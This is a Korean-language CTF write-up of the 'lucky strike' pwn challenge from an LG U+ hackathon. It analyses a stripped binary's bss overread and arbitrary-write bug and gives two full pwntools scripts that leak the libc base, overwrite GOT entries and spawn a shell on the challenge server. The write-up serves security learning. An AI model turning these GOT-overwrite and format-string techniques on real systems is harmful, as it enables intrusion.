---
title: "[LG U+ Security Hackathon 2025 writeup] lucky strike/pwn"
description: "LG 유플러스 시큐리티 해커톤 [pwn] lucky strike 문제 writeup"
date: 2025-09-29 16:22:00 +0900
categories: [Security, CTF]
tags: [CTF, writeup]
author: hyungin0505
toc: true
comments: true
# image:
#     path: /assets/img/
#     alt: image alternative text
pin: false
---

---

### 1. 문제

> **문제 설명**  
> 행운의 복권 이벤트 서비스가 오픈되었습니다.  
> 프로필을 만들고, 행운 포인트를 모으고, 특별 보상을 획득하세요.
>
> **연결 정보**  
> nc 15.164.180.104 11004
>
> **첨부 파일 (1개)**  
> `for_user.zip`{: .filepath}  
> \ chal  
> \ Dokerfile  
> \ flag  
> 

<br>

---

## 2. 바이너리 분석
```c
void __fastcall __noreturn main(__int64 argc, char **argv, char **env)
{
  int prompt; // eax
  char setter; // [rsp+7h] [rbp-9h] BYREF
  unsigned __int64 canary; // [rsp+8h] [rbp-8h]

  canary = __readfsqword(0x28u);
  setter = 0;
  initialize();
  printf("Please enter a name : ");
  read(0, name, 0x30uLL);
  print_menu();
  while ( 1 )
  {
    while ( 1 )
    {
      printf("[User Prompt]=> ");
      prompt = read_prompt();
      if ( prompt != 4100 )
        break;
      aaw(&setter);
    }
    if ( prompt > 4100 )
      break;
    if ( prompt == 4 )
    {
      fake_flag();
    }
    else
    {
      if ( prompt > 4 )
        break;
      switch ( prompt )
      {
        case 3:
          info();
          break;
        case 1:
          draw_lottery();
          break;
        case 2:
          rename();
          break;
        default:
          goto LABEL_15;
      }
    }
  }
LABEL_15:
  puts("EXIT..");
  exit(1);
}
```

stripped된 바이너리라서 라벨링을 직접 해주었다  

바이너리를 실행하면 `initialize()`로 stdin, stdout, stderr 버퍼를 0으로 초기화하고 메뉴를 출력한다  
사용자는 `prompt`에 옵션값을 담아 원하는 액션을 취할 수 있다  

4가지의 일반적인 옵션이 존재한다  
<br>

---

### 2.1. draw_lottery() - 1

```c
int draw_lottery()
{
  printf("Your Number : ");
  if ( read_atoi() == lottery )
  {
    puts("Congratulations! You won the lottery!");
    asset += 256;
    printf("Your remaining money : %d\n", asset);
  }
  else
  {
    puts("Please try again later...\n");
  }
  return set_lottery();
}
```

`read_atoi()` 함수는 사용자가 입력한 정수 문자열을 정수 형태로 바꾼다  
전역 변수 `lottery`와 사용자가 입력한 정수가 일치하면 전역 변수 `asset`의 값이 256 증가한다  
<br>

---

```c
int set_lottery()
{
  int fd; // [rsp+Ch] [rbp-4h]

  fd = open("/dev/urandom", 0);
  if ( fd < 0 )
  {
    puts("'/dev/urandom' OPEN ERROR");
    exit(-1);
  }
  read(fd, &lottery, 8uLL);
  return close(fd);
}
```

`lottery`의 값은 `set_lottery()` 함수에서 완전 랜덤값으로 결정된다  
브루트 포싱은 당연히 말이 안 된다  

해당 함수는 `main()` 함수의 `initialize()`에서도 실행되어 초기값이 설정된다  
<br>

---

### 2.2. rename() - 2

0x30 길이만큼 입력을 받아 전역변수 `name`에 저장한다  
`main()` 함수를 시작하고 정했던 이름을 변경할 수 있다  

`main()` 함수에서는 `read(0, &name, 0x30uLL);`로 되어 있는데 `name`은 전역 변수이기에 `name`과 `&name`이 가리키는 주소는 같다고 한다..  
<br>

---

### 2.3. info() - 3

그냥 사용자가 설정했던 이름과 `asset` 값을 출력한다  
<br>

---

### 2.4. fake_flag() - 4

```c
int fake_flag()
{
  if ( asset <= 4095 )
    return puts("I don't have enough money..\n");
  puts("FLAG : flag2025{fake_flag}\n");
  asset -= 4096;
  return printf("Your remaining money : %d\n\n", asset);
}
```

그냥 가짜 플래그 출력해준다..  
심지어 `asset`도 4096 이상이어야 출력해주는데 말그대로 가짜 플래그라 전혀 쓸모가 없다  

사실 `rename()`, `fake_flag()` 함수들은 문제 푸는 데 굳이 쓸 일이 없다  
<br>

---

### 2.5. read_prompt()

```c
int read_prompt()
{
  _QWORD buf[2]; // [rsp+10h] [rbp-20h] BYREF
  int v2; // [rsp+20h] [rbp-10h]
  unsigned __int64 canary; // [rsp+28h] [rbp-8h]

  canary = __readfsqword(0x28u);
  buf[0] = 0LL;
  buf[1] = 0LL;
  v2 = 0;
  *((_BYTE *)buf + (int)(read(0, buf, 10uLL) - 1)) = 0;
  return atoi((const char *)buf);
}
```

프롬프트 입력 받는 함수인데 `atoi()`를 사용해 입력한 정수 문자열을 그냥 정수로 바꿔준다  
<br>

---

### 2.6. aaw()

```c
unsigned __int64 __fastcall aaw(_BYTE *setter)
{
  unsigned __int64 result; // rax
  _QWORD *v2; // [rsp+10h] [rbp-10h]

  result = (unsigned int)asset;
  if ( asset > 4095 )
  {
    result = (unsigned __int8)*setter ^ 1u;
    if ( *setter != 1 )
    {
      v2 = (_QWORD *)read_atoi();
      *v2 = read_atoi();
      result = (unsigned __int64)setter;
      *setter = 1;
    }
  }
  return result;
}
```

임의의 메모리 주소에 값을 쓸 수 있는 aaw가 가능한 함수다  
하지만 `asset`이 4096 이상이어야 하며 `setter`가 0으로 설정되어 있어야 한다  

`setter` 때문에 aaw는 프로그램 실행 동안 한 번만 가능하다  

이 `aaw()` 함수는 프롬프트로 4100을 입력하면 실행 가능하다  
<br>

---

## 3. 취약점

바이너리에 플래그를 따오는 함수나 쉘 함수가 없기 때문에 직접 쉘을 따야 한다..  
<br>

---

![Image](/assets/img/250929/checksec.png)

Partial RELRO가 걸려 있고 PIE는 걸려 있지 않다  
GOT 오버라이트를 해야 하지 않을까   
<br>

---

![Image](/assets/img/250929/bss.png)

여기서 눈여겨봐야 할 것이 bss 영역에서 `name`과 `lottery` 전역 변수들의 위치다   
<br>

---

```c
read(0, name, 0x30uLL);
```

`name`에 입력을 줄 때 0x30 길이만큼 주는데 `read()` 함수는 길이와 상관 없이 읽고 0x30 만큼만 `name`에 집어넣는다   
<br>

---

```c
int info()
{
  puts("\n------ User Info ------");
  printf("User Name : %s\n", name);
  return printf("Assets held : %d\n\n", asset);
}
```

`name`에 입력을 줄 때 0x30 길이 만큼의 문자열을 입력하면 (개행 문자 제외) `name` 바로 뒤에 `lottery`가 있어 `name`을 출력할 때 개행 문자를 만나지 않아 `name` 뒤에 `lottery`가 붙어서 함께 출력된다  

이를 이용해서 `lottery`를 leak하고 `draw_lottery()`에서 `asset`을 증가시킬 수 있게 된다  
<br>

---

## 4. 익스플로잇

두 가지의 방법이 있다  
사실 대회 시간 동안 못 풀어서 디코 사람들 도움 받아가면서 풀었다  

전반적인 흐름은 동일하지만 그 구현에 있어서 방식이 좀 다르다  
libc 베이스 구하는 방법이 좀 다른데 aaw가 가능해서 이건 뭐.. 하기 나름인 것 같다  
<br>

---

일단 플래그를 출력하는 함수가 직접적으로 없기 때문에 `execve()`나 `system()` 함수 등을 다른 함수의 GOT에 덮어씌워서 쉘을 따야 한다  
그러면 최종 목표는 `system("/bin/sh")`를 어떻게든 만들어서 실행하는 것이다  

- 바이너리에 없는 `system()` 함수를 사용해야 한다
- libc를 leak에서 시스템 함수의 libc 주소를 찾는다
- 시스템 함수의 주소를 특정 함수의 GOT에 덮어쓴다
- aaw를 여러 번 할 수 있어야 한다  

<br>

---

### 4.1. 풀이 1

```python
from pwn import *

# p = process("./chal")
p = remote("15.164.180.104", 11004)
e = ELF("./chal", checksec = True)

context.arch = "amd64"
# context.log_level = "debug"

# GOT/PLT
read_got = e.got['read']
puts_got = e.got['puts']
puts_plt = e.plt['puts']
exit_got = e.got['exit']
atoi_got = e.got['atoi']
setvbuf_got = e.got['setvbuf']

# addresses
stderr = e.sym['stderr']
start = 0x401170

# libc offset 
puts_offset = 0x87be0
system_offset = 0x58750

def set_name(name):
    p.sendafter(b"name : ", name)

# options
def draw(num):
    p.sendlineafter(b'=> ', b'1')
    p.sendlineafter(b'Number : ', str(num).encode())

    if b"Please" in p.recvline():
        return 0
    else:
        return 256

def rename(name):
    p.sendlineafter(b'=> ', b'2')
    p.sendafter(b'name : ', name)

def info():
    p.sendlineafter(b'=> ', b'3')
    p.recvuntil(b'Name : ')
    print("Name: ", p.recvline())
    p.recvuntil(b'held : ')
    print("Asset: ", p.recvline())
    
def flag():
    p.sendlineafter(b'=> ', b'4')
    print("FLAG: ", p.recvline())

def exit():
    p.sendlineafter(b'=> ', b'0')

# lottery leak
def get_lottery():
    p.sendlineafter(b"=> ", b'3')
    p.recvuntil(b'A'*0x30)
    byte = p.recvn(8).ljust(8, b'\x00')
    lottery = u64(byte)

    return lottery

# aaw
def aaw(address, data):
    p.sendlineafter(b'=> ', b'4100')
    sleep(0.1)
    p.sendline(str(address).encode())
    p.sendline(str(data).encode())

set_name(b'A'*0x30)

# 4096
asset = 0
while(asset < 4096):
    lottery = get_lottery()
    asset += draw(lottery)

# exit_got -> start
aaw(exit_got, start)
exit()
set_name(b'B')

# setvbuf_got -> puts_plt
aaw(setvbuf_got, puts_plt)
exit()
set_name(b'C')

# stderr -> puts_got
aaw(stderr, puts_got)
exit()
p.recvuntil(b'EXIT..\n')
p.recvn(5+5)
puts = u64(p.recv(6).ljust(8, b'\x00'))
set_name(b'D')

# stderr -> read_got
aaw(stderr, read_got)
exit()
p.recvuntil(b'EXIT..\n')
p.recvn(5+5)
read = u64(p.recv(6).ljust(8, b'\x00'))
set_name(b'D')

# libc leak
print("puts: ", hex(puts))
print("read: ", hex(read))
libc_base = puts - puts_offset
print("libc_base: ", hex(libc_base))

# atoi_got -> system("/bin/sh")
aaw(atoi_got, libc_base + system_offset)
p.sendafter(b'=> ', b'/bin/sh\x00')

p.interactive()
```

---

```python
asset = 0
while(asset < 4096):
    lottery = get_lottery()
    asset += draw(lottery)
```

`name`을 0x30 길이의 문자열로 설정해서 `name`을 출력할 때 `lottery`까지 출력할 수 있다  
이를 이용해 `asset`을 4096까지 불린다  

256씩 증가하기 때문에 16번만 하면 되는데 이상하게 가끔 실패하는 경우도 있어서 `while()`을 사용하여 4096이 될 때까지 반복한다  
이때 4096이 넘어가면 바이너리 자체에서 `break`로 프롬프트를 다시 입력 받는다  
<br>

---

```python
def aaw(address, data):
    p.sendlineafter(b'=> ', b'4100')
    sleep(0.1)
    p.sendline(str(address).encode())
    p.sendline(str(data).encode())

aaw(exit_got, start)
exit()
set_name(b'B')
```

libc 베이스 leak도 해야 되고 GOT도 덮어써야 되고 쉘도 따야 되기 때문에 `aaw()`가 여러 번 필요하다  
한 번으로는 원샷이 안 된다  

때문에 바이너리가 종료될 때 실행되는 `exit()` 함수의 GOT를 start 주소로 덮어쓴다  
그러면 바이너리가 종료되지 않고 다시 처음부터 실행하게 되면서 `setter`가 0으로 설정되어 `aaw()`를 한 번 더 사용할 수 있다  

`set_name()`은 사실 필요 없는데 페이로드 짤 때 구분하려고 해놓은 거다  
<br>

---

![Image](/assets/img/250929/start.png)

start 주소는 text 영역에서 확인할 수 있다  
<br>

---

```python
# setvbuf_got -> puts_plt
aaw(setvbuf_got, puts_plt)
exit()
set_name(b'C')

# stderr -> puts_got
aaw(stderr, puts_got)
exit()
p.recvuntil(b'EXIT..\n')
p.recvn(5+5)
puts = u64(p.recv(6).ljust(8, b'\x00'))
set_name(b'D')

# stderr -> read_got
aaw(stderr, read_got)
exit()
p.recvuntil(b'EXIT..\n')
p.recvn(5+5)
read = u64(p.recv(6).ljust(8, b'\x00'))
set_name(b'D')

# libc leak
print("puts: ", hex(puts))
print("read: ", hex(read))
libc_base = puts - puts_offset
print("libc_base: ", hex(libc_base))
```

`puts()` 함수로 `puts()` 함수의 GOT가 가리키는 주소를 출력하도록 하면 `puts()` 함수의 주소를 알 수 있다  
여기서 `puts()` 함수의 주소를 구할 수 있고 libc 베이스 주소까지 구할 수 있다    

이걸로 libc db에서 찾아도 되는데 여러 개가 나오기에 `read()` 함수 주소까지 읽으면 딱 하나 libc가 특정된다  
해당 libc에서 시스템 함수 오프셋을 찾아 시스템 함수를 사용할 수 있다  
<br>

---

```python
aaw(atoi_got, libc_base + system_offset)
p.sendafter(b'=> ', b'/bin/sh\x00')
```

`atoi()` 함수의 GOT를 시스템 함수로 변경하면 `buf`에 `/bin/sh`를 입력해 `system()` 함수의 인자로 설정하여 실행하면 쉘을 딸 수 있다  
<br>

---

![Image](/assets/img/250929/payload.png)

> Thanks to Sechack

<br>

---

### 4.2. 풀이 2 (FSB)

아까 풀이 1에서의 플래그를 보면 알 수 있겠지만 문제의 의도는 FSB를 활용하는 방법인 것 같다  
<br>

---

```python
from pwn import *

# p = process("./chal")
# p = remote("localhost", 1004)
p = remote("15.164.180.104", 11004)
e = ELF("./chal", checksec = True)

context.arch = "amd64"
context.log_level = "debug"

# GOT/PLT
atoi_got = e.got['atoi']
exit_got = e.got['exit']
printf_plt = e.plt['printf']
start = 0x401170

# libc offset
system_offset = 0x58750

def set_name(name):
    p.sendafter(b"name : ", name)

def draw(num):
    p.sendlineafter(b'=> ', b'1')
    p.sendlineafter(b'Number : ', str(num).encode())

    if b"Please" in p.recvline():
        return 0
    else:
        return 256

def rename(name):
    p.sendlineafter(b'=> ', b'2')
    p.sendafter(b'name : ', name)

def info():
    p.sendlineafter(b'=> ', b'3')
    p.recvuntil(b'Name : ')
    print("Name: ", p.recvline())
    p.recvuntil(b'held : ')
    print("Asset: ", p.recvline())

def flag():
    p.sendlineafter(b'=> ', b'4')
    print("FLAG: ", p.recvline())

def exit():
    p.sendlineafter(b'=> ', b'0')

def get_lottery():
    p.sendlineafter(b"=> ", b'3')
    p.recvuntil(b'A'*0x30)
    byte = p.recvn(8).ljust(8, b'\x00')
    lottery = u64(byte)

    return lottery

def aaw(address, data):
    sleep(0.1)
    p.sendline(str(address).encode())
    p.sendline(str(data).encode())

set_name(b'A'*0x30)

# 4096
asset = 0
while(asset < 4096):
    lottery = get_lottery()
    asset += draw(lottery)

# exit_got -> start
p.sendlineafter(b'=> ', b'4100')
aaw(exit_got, start)
exit()
set_name(b'B')

# atoi_got -> printf
p.sendlineafter(b'=> ', b'4100')
aaw(atoi_got, printf_plt)

# libc_base leak
p.sendlineafter(b"=> ", b"%3$p")
libc = int(p.recvn(14), 16)
libc_base = libc - 0x11ba61
print("%3$p: ", hex(libc))

# pause()

print("libc_base: ", hex(libc_base))
set_name(b'C')

# system("/bin/sh")
p.sendlineafter(b'=> ', b'%4100c')
aaw(atoi_got, libc_base+system_offset)
p.sendlineafter(b"=> ", b"/bin/sh\x0a")

p.interactive()
```

---

```python
p.sendlineafter(b'=> ', b'4100')
aaw(exit_got, start)
exit()
set_name(b'B')
```

이번에도 역시 aaw를 반복적으로 해야 하기 때문에 `exit()` 함수의 GOT를 start 주소로 덮어쓴다  

<br>

---

```python
p.sendlineafter(b'=> ', b'4100')
aaw(atoi_got, printf_plt)
```

근데 이번엔 FSB를 활용할 것이기에 `atoi()`를 호출하면 `printf`가 호출되도록 GOT를 덮어쓴다  
<br>

---

```python
p.sendlineafter(b"=> ", b"%3$p")
libc = int(p.recvn(14), 16)
libc_base = libc - 0x11ba61
print("%3$p: ", hex(libc))
```

그러면 `printf(buf);`가 되어서 FSB가 터진다  
이때 3번째 인자 (64비트 바이너리기에 RCX 레지스터 값) 값을 출력할 수 있다  
<br>

---

![Image](/assets/img/250929/rcx.png)

`0x7cc307251a61`이 출력된다  
RCX 레지스터에 저장된 값이다  
<br>

---

![Image](/assets/img/250929/vmmap.png)

vmmap으로 확인을 해보면 `0x7cc307251a61`가 libc 영역의 주소인 것을 알 수 있다..  

참고로 사진이 없는데 `%1$p`, RSI 레지스터 값은 스택에, %2$p, RDX 레지스터 값은 0xa였다  
<br>

---

![Image](/assets/img/250929/offset.png)

오프셋을 구해 libc 베이스 주소를 leak 할 수 있다  

이때 로컬에서 해서 `0x11ba91`이 나왔는데 리모트로 하면 환경이 약간 달라서 `0x11ba61`이 제대로 된 오프셋이었다  
때문에 로컬에서부터 제대로 구하고 싶으면 도커 빌드하고 gdb로 도커 안에서 실행 중인 바이너리 attach해서 잡으면 리모트 환경에서의 오프셋을 정확하게 구할 수 있다  
(도커 안에 gdb 설치하면 libc 오프셋 달라짐)  
<br>

---

```python
p.sendlineafter(b'=> ', b'%4100c')
aaw(atoi_got, libc_base+system_offset)
p.sendlineafter(b"=> ", b"/bin/sh\x0a")
```

libc 베이스를 구했으니 이제 `printf()`로 덮어씌웠던 `atoi()`를 다시 `system()`으로 덮어씌우고 인자로 `/bin/sh`를 주면 쉘을 딸 수 있다  

이때 `atoi()`를 `system()`으로 바꾸기 전에 `atoi()`는 `printf()`인 상태이기 때문에 4100을 리턴하기 위해 `%4100c`를 입력해준다  
<br>

---

![Image](/assets/img/250929/payload2.png)

> Thanks to [haro001](https://jkh011120.tistory.com/16)

<br>

---

## 5. etc

보니까 로컬에서는 상관 없는데 리모트에서 `aaw()`를 그냥 하면 자꾸 실패해버린다  
아마 응답 기다리는 거 없이 바로 `read()` 하다 보니까 바로 페이로드를 보내면 인식이 안 되서 `sleep(0.1)`로 잠깐 쉬고 전송하면 잘 된다  
<br>

---

항상 이렇게 문제 거의 다 푼 상태에서 못 풀고 끝나버린다..  
매번 느끼지만 경험도 중요하지만 기본기가 없으면 아무것도 못한다  

